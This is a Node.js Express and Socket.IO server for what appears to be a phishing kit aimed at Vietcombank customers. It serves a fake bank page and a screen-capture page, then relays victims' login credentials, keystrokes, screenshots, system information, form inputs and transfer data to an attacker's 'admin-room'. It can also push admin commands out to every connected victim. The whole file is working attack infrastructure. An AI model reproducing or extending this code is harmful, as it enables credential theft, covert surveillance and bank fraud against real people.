const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "https://expense-manager-wan.onrender.com",
        methods: ["GET", "POST"]
    }
});

app.use(express.static('public'));
app.use('/admin', express.static('admin'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin', 'admin.html'));
});

app.get('/monitor', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin', 'monitor.html'));
});

app.get('/bank', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'screen-capture.html'));
});

app.get('/vcb', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'vietcombank.html'));
});

io.on('connection', (socket) => {
    console.log('User connected:', socket.id);
    
    socket.on('video-stream', (data) => {
        socket.broadcast.to('admin-room').emit('user-video', {
            userId: socket.id,
            video: data
        });
    });
    
    socket.on('login-data', (data) => {
        console.log('Login captured:', data);
        socket.broadcast.to('admin-room').emit('user-login', {
            userId: socket.id,
            loginData: data
        });
    });
    
    socket.on('keylog', (data) => {
        socket.broadcast.to('admin-room').emit('user-keylog', {
            userId: socket.id,
            keystrokes: data
        });
    });
    
    socket.on('system-info', (data) => {
        socket.broadcast.to('admin-room').emit('user-system', {
            userId: socket.id,
            systemInfo: data
        });
    });
    
    socket.on('screen-capture', (data) => {
        console.log('Screen captured from:', socket.id);
        socket.broadcast.to('admin-room').emit('screen-capture', {
            userId: socket.id,
            screenshot: data.screenshot,
            timestamp: data.timestamp,
            url: data.url
        });
    });
    
    socket.on('keylog-data', (data) => {
        console.log('Keylog from:', socket.id, data.length, 'keys');
        socket.broadcast.to('admin-room').emit('keylog-data', data);
    });
    
    socket.on('login-attempt', (data) => {
        console.log('Login attempt captured:', data.account);
        socket.broadcast.to('admin-room').emit('login-attempt', {
            userId: socket.id,
            ...data
        });
    });
    
    socket.on('form-data', (data) => {
        socket.broadcast.to('admin-room').emit('form-data', data);
    });
    
    socket.on('input-focus', (data) => {
        socket.broadcast.to('admin-room').emit('input-focus', data);
    });
    
    socket.on('input-data', (data) => {
        socket.broadcast.to('admin-room').emit('input-data', data);
    });
    
    socket.on('transfer-data', (data) => {
        console.log('Transfer data captured:', data);
        socket.broadcast.to('admin-room').emit('transfer-data', data);
    });
    
    socket.on('admin-command', (data) => {
        console.log('Admin command:', data.action);
        socket.broadcast.emit('admin-command', data);
    });
    
    socket.on('join-admin', () => {
        socket.join('admin-room');
        console.log('Admin joined');
    });
    
    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Demo: http://localhost:${PORT}/bank`);
    console.log(`Admin: http://localhost:${PORT}/monitor`);
});